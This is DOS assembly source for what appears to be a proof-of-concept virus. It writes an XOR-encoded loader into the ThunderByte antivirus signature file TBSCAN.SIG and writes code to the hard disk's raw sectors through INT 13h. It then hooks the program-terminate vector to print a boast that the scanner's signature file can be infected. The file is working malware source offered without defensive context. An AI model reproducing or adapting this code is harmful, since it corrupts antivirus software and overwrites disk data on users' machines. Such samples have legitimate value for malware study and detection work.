;
;
;
.model tiny
.code
.radix 16

                org 100

main:           mov ax,3d02
                lea dx,tbscan_sig
                int 21
                xchg ax,bx
                mov ax,4200
                xor cx,cx
                mov dx,90
                int 21
                lea si,crypt
                mov cx,crypt_len
encode:         xor byte ptr [si],44
                inc si
                loop encode
                mov ah,40
                lea dx,crypt
                mov cx,crypt_len
                int 21
                mov ah,3e
                int 21
                mov ax,0301
                lea bx,loader_part
                mov cx,2
                mov dx,80
                int 13
                mov ax,4c00
                int 21

loader_part:
                call delta
delta:          pop bp
                sub bp,offset delta
                push cs
                pop ds
                mov ax,3522
                int 21
                mov word ptr ds:old_22[bp],bx
                mov word ptr ds:old_22+2[bp],es
                mov ah,62
                int 21
                mov ds,bx
                lea dx,new_22[bp]
                mov word ptr ds:[0a],dx
                mov word ptr ds:[0c],cs
                retf
new_22:         pushf
                push ax dx bp ds
                call de
de:             pop bp
                sub bp,offset de
                push cs
                pop ds
                mov ah,9
                lea dx,msg[bp]
                int 21
                pop ds bp dx ax
                popf
host:           db 0ea
old_22          dd 0
crypt:          push ax bx cx dx bp es
                call d
d:              pop bp
                sub bp,offset d
                lea ax,done[bp]
                push cs
                push ax
                mov ax,0bc00
                mov es,ax
                mov ax,0201
                xor bx,bx
                cmp byte ptr es:[bx],0e8
                jne readit
                retf
readit:         push es
                push bx
                mov cx,2
                mov dx,80
                int 13
                retf
done:           pop es bp dx cx bx ax
                clc
                retf

crypt_len       equ $-crypt
msg             db 0dh,0a
                db 'Yes, Rogue! It''s possible to infect TBSCAN.SIG this way!',0dh,0ah
                db '$'
tbscan_sig      db 'TBSCAN.SIG',0


buffer          equ $

end main
